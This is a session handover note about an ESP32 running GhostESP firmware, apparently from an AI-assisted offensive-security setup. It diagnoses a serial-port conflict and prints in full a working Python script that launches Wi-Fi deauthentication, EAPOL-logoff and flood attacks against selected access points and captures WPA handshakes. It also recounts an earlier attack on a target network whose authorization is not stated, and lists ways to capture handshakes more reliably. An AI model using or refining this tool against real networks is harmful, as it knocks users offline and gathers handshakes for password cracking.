# Handover — ESP32 UART Capture: Commands-vs-Streamed-Data Conflict

Session date: 2026-09-20

## Problem

Jack was running two separate processes against the ESP32's single serial port
(`/dev/ttyACM0`, 115200 baud, GhostESP firmware):

- `~/mcp-kit/servers/ghostesp.py` — an MCP server that sends GhostESP CLI
  commands (scan, select AP, launch attacks like deauth/eapol_logoff, etc.)
- `~/devicedb/raw/esp32_listener.py` — a standalone binary listener meant to
  capture the raw UART stream (WPA handshake bytes etc.) to a `.pcap` file

Running both at once failed: the ESP32 exclusively locks `/dev/ttyACM0` to whichever
process opened it first — only one reader/writer at a time. Whichever process didn't
have the port got evicted or read 0 bytes.

This was already documented independently in three places on this box:

**`~/devicedb/raw/wifi_recon_session_notes.md`** (notes from a prior crashed
session that hit exactly this, empirically). It records a deauth/EAPOL logoff attack
against a target network (SSID/BSSID redacted, ch7, WPA2) that produced 295 then 463
frames onboard, but the binary listener captured only 0–4 bytes on every attempt. It
diagnoses the same exclusive-port lock: "With `wait=20` (long hold): listener kicked
out, 0 bytes. With `wait=2` (short hold): attack finishes before listener connects, 0
bytes." It recommends adopting devicedb's single-session pattern to resume with.

**`~/.hermes-offsec/skills/offsec/ghostesp-operations/SKILL.md`** states under
"Operational Architecture: Exclusive Port Reality": "`/dev/ttyACM0` is EXCLUSIVELY held
— only ONE process can read it at a time. The MCP server (`ghostesp.py`) holds the port
while a command is in flight. Any other process trying to open the port (listener,
`cat`, second MCP call) is kicked out." It documents a timing-based workaround as the
"Working sequence for handshake capture": start `esp32_listener.py` first so it grabs
the port, then fire the attack via MCP with a short `wait=2` so the MCP releases the
port quickly and the listener can hold it through the ~15-20s onboard attack.

**`~/.hermes-offsec/skills/offsec/ghostesp-operations/references/esp32-capture-flow.md`**
states plainly under "Can we capture the UART stream on the Kali side?": "**No — not
with a secondary listener.** `/dev/ttyACM0` is exclusively held by the process that
opens it (MCP server via `ghostesp.py`). A secondary reader (`cat /dev/ttyACM0 > file`)
exits immediately — the file stays 0 bytes." Its session observation log for
2026-09-20 confirms: "A `cat /dev/ttyACM0 > log` listener failed — exclusive port."

**Correction to the prior session's notes:** `wifi_recon_session_notes.md` claims
"SKILL.md says dual-channel works, reference doc says it doesn't — conflict found."
On inspection this was a misreading by that crashed session. Both documents actually
agree the port is strictly exclusive — neither claims real concurrency works. SKILL.md
just describes a *timing workaround* (start the listener first, then fire the MCP
command with a short `wait` so it releases the port quickly, letting the listener catch
the attack window) — that is sequencing around a hard exclusivity constraint, not
dual-channel access. There is no actual contradiction between the two docs.

## Root cause (two bugs, not one)

1. **Structural:** two separate OS processes can't both hold one exclusive serial port
   at once (above).
2. **A second, independent bug in `ghostesp.py`:** its `_cmd()` and `_stream()`
   functions decode all serial output as UTF-8 with `errors="replace"`:

   ```python
   def _cmd(s, cmd, wait=1.0):
       ...
       return out.decode("utf-8", errors="replace")
   ```

   ```python
   def _stream(s, cmd, seconds):
       ...
       return out.decode("utf-8", errors="replace")
   ```

   (`~/mcp-kit/servers/ghostesp.py`, lines 38 and 66.) That's fine for normal
   CLI text responses, but would silently corrupt binary capture data (WPA handshake
   bytes, raw PCAP frames) if ghostesp.py's output path were ever used for the actual
   capture stream instead of plain text output.

## The fix

`~/devicedb/raw/esp32_attack_capture.py` merges the command-sender and the
listener into ONE process, ONE open serial connection — the same pattern
`devicedb.py` itself already uses successfully for its own sweeps (one open pyserial
session, send command, immediately read the reply, repeat).

- The capture path (`capture_raw()`) writes every byte straight to the output file with
  NO decode step — stays pure binary, so it doesn't have ghostesp.py's UTF-8 corruption
  bug.
- Short control-command replies (select/stopdeauth) go through a separate text-decode
  path (`drain_text()`) that never touches the capture file.

CLI usage, exactly as given in the script's own docstring/argparse help:

```
python3 esp32_attack_capture.py --select 25 --attack eapol_logoff --wait 20
python3 esp32_attack_capture.py --attack deauth --wait 15 --out /tmp/capture.pcap
python3 esp32_attack_capture.py --raw "list -a" --wait 3   # just a command, no attack
```

Options (from the docstring):

```
--port PORT      serial device (default /dev/ttyACM0)
--baud BAUD      baud rate (default 115200)
--select IDX     AP index/indices to select first, e.g. "25" or "1,3,5"
--attack TYPE     deauth | deauthall | handshake | channel_switch |
                  eapol_logoff | probe_flood | bad_msg | auth_flood | sae_flood
--raw CMD         send an arbitrary raw command instead of/along with --attack
--wait SECONDS    how long to hold the port open and capture (default 15)
--out PATH        capture file (default ~/devicedb/raw/esp32_capture.pcap)
```

Full script (verbatim):

```python
#!/usr/bin/env python3
"""esp32_attack_capture.py — merged GhostESP command + raw-capture tool.

Replaces the two-process split (ghostesp.py MCP server sending commands +
esp32_listener.py separately reading /dev/ttyACM0) that deadlocked on the
board's exclusive-port lock (see ~/devicedb/raw/wifi_recon_session_notes.md
and ~/.hermes-offsec/skills/offsec/ghostesp-operations/references/esp32-capture-flow.md).

Same fix devicedb.py already uses: ONE serial session, in one process,
does the asking AND the reading. No second listener competing for the port.

Extra fix vs. ghostesp.py's own _cmd()/_stream(): this reads and writes RAW
BYTES to the capture file (no UTF-8 decode). A WPA handshake / PCAP stream is
binary; decode(errors="replace") — what ghostesp.py's MCP tools do for
human-readable text output — silently corrupts binary capture data. Command
replies (which ARE text) are decoded separately for display; only the
capture file gets the untouched raw bytes.

Usage:
    python3 esp32_attack_capture.py --select 25 --attack eapol_logoff --wait 20
    python3 esp32_attack_capture.py --attack deauth --wait 15 --out /tmp/capture.pcap
    python3 esp32_attack_capture.py --raw "list -a" --wait 3   # just a command, no attack

Options:
    --port PORT      serial device (default /dev/ttyACM0)
    --baud BAUD      baud rate (default 115200)
    --select IDX     AP index/indices to select first, e.g. "25" or "1,3,5"
    --attack TYPE     deauth | deauthall | handshake | channel_switch |
                      eapol_logoff | probe_flood | bad_msg | auth_flood | sae_flood
    --raw CMD         send an arbitrary raw command instead of/along with --attack
    --wait SECONDS    how long to hold the port open and capture (default 15)
    --out PATH        capture file (default ~/devicedb/raw/esp32_capture.pcap, ~ expanded)
"""
import argparse
import os
import sys
import time

import serial  # pyserial

ATTACK_FLAGS = {
    "deauth": "-d", "deauthall": "-d", "handshake": "-hsd",
    "channel_switch": "-c", "eapol_logoff": "-e", "probe_flood": "-p",
    "bad_msg": "-b", "auth_flood": "-a", "sae_flood": "-s",
}


def open_port(port, baud):
    return serial.Serial(port, baud, timeout=1)


def send(ser, cmd):
    """Send one line to the ESP32. No read here — reading is the caller's job,
    so raw capture bytes never pass through a text decode."""
    ser.reset_input_buffer()
    ser.write(cmd.encode() + b"\r")


def drain_text(ser, wait):
    """Read for `wait` seconds and return it decoded as text — for short
    control commands (select/stop) whose replies are just CLI text, not a
    binary capture stream."""
    out = b""
    end = time.time() + wait
    while time.time() < end:
        chunk = ser.read(ser.in_waiting or 1)
        if chunk:
            out += chunk
    return out.decode("utf-8", errors="replace").strip()


def capture_raw(ser, wait, log):
    """Read for `wait` seconds, writing every byte untouched to `log`.
    This is the merged listener half — same loop as the old
    esp32_listener.py, just living in the same process as the command
    sender instead of a second one fighting for the port."""
    total = 0
    end = time.time() + wait
    while time.time() < end:
        chunk = ser.read(ser.in_waiting or 1)
        if chunk:
            log.write(chunk)
            log.flush()
            total += len(chunk)
    return total


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default="/dev/ttyACM0")
    ap.add_argument("--baud", type=int, default=115200)
    ap.add_argument("--select", default=None, help="AP index/indices to select, e.g. '25' or '1,3,5'")
    ap.add_argument("--attack", choices=sorted(ATTACK_FLAGS), default=None)
    ap.add_argument("--raw", default=None, help="arbitrary raw firmware command")
    ap.add_argument("--wait", type=float, default=15.0, help="seconds to hold the port + capture")
    ap.add_argument("--out", default=os.path.expanduser("~/devicedb/raw/esp32_capture.pcap"))
    args = ap.parse_args()

    if not args.attack and not args.raw:
        ap.error("need --attack or --raw (nothing to send)")

    print(f"Opening {args.port} @ {args.baud}...", flush=True)
    ser = open_port(args.port, args.baud)
    time.sleep(1)
    # Drain whatever's sitting in the buffer from before we opened.
    if ser.in_waiting:
        ser.read(ser.in_waiting)

    try:
        if args.select:
            send(ser, f"select -a {args.select}")
            reply = drain_text(ser, 1.5)
            print(f"select -a {args.select} -> {reply or '(no reply)'}", flush=True)

        if args.raw and not args.attack:
            send(ser, args.raw)
            reply = drain_text(ser, args.wait)
            print(f"{args.raw} -> {reply or '(no reply)'}", flush=True)
            return

        cmd = args.raw if args.raw else f"attack {ATTACK_FLAGS[args.attack]}"
        print(f"Sending: {cmd}", flush=True)
        print(f"Capturing raw bytes to {args.out} for {args.wait}s...", flush=True)

        with open(args.out, "wb") as log:
            send(ser, cmd)
            total = capture_raw(ser, args.wait, log)

        print(f"Captured {total} bytes -> {args.out}", flush=True)

        # Stop the attack the same way ghostesp.py does.
        send(ser, "stopdeauth")
        stop_reply = drain_text(ser, 1.0)
        if stop_reply:
            print(f"stopdeauth -> {stop_reply}", flush=True)

        if total < 100:
            print("WARNING: <100 bytes captured — likely missed the capture "
                  "window or nothing was in range (see esp32-capture-flow.md).",
                  file=sys.stderr)

    finally:
        ser.close()


if __name__ == "__main__":
    main()
```

## Known follow-up issues (not yet fixed — open items)

The Hermes offsec agent reviewed this script and flagged 4 real issues, from verbal
review (no written source for this section — accurate paraphrase from that feedback):

1. **`stopdeauth` is hardcoded as the stop command regardless of attack type** — for
   non-deauth attacks (`probe_flood`, `sae_flood`, etc.) this may be a no-op or wrong
   command entirely. Should map the stop command per attack type instead of always
   sending `stopdeauth`.
2. **The raw capture file isn't a valid standalone `.pcap`** — it interleaves the
   ESP32's own CLI status text output with actual frame bytes in one raw stream. If
   this needs to open cleanly in Wireshark/tshark, it needs either a different
   filename/extension (to stop implying it's a ready-to-open pcap) or a framing filter
   to separate log lines from frame data.
3. **Short `--wait` values risk missing the actual handshake** — e.g. for an
   `eapol_logoff` attack against a target at weak RSSI, the client's reconnect window
   can exceed a 10-15s capture window.
4. **The read loop (`ser.read(ser.in_waiting or 1)`) falls back to a blocking 1-byte
   read** (up to the port's 1s timeout) whenever nothing is waiting — over a 20s
   capture this can add meaningful extra latency. A shorter timeout or select/poll on
   the fd would tighten this.

## Files referenced

- `~/devicedb/raw/esp32_attack_capture.py` — the new merged script (a copy
  also lives in this handover folder: `esp32_attack_capture.py`)
- `~/devicedb/raw/esp32_listener.py` — old, superseded — still on disk, not
  deleted
- `~/mcp-kit/servers/ghostesp.py` — MCP server — still in use for non-capture
  commands, untouched
- `~/devicedb/raw/wifi_recon_session_notes.md`
- `~/.hermes-offsec/skills/offsec/ghostesp-operations/SKILL.md`
- `~/.hermes-offsec/skills/offsec/ghostesp-operations/references/esp32-capture-flow.md`
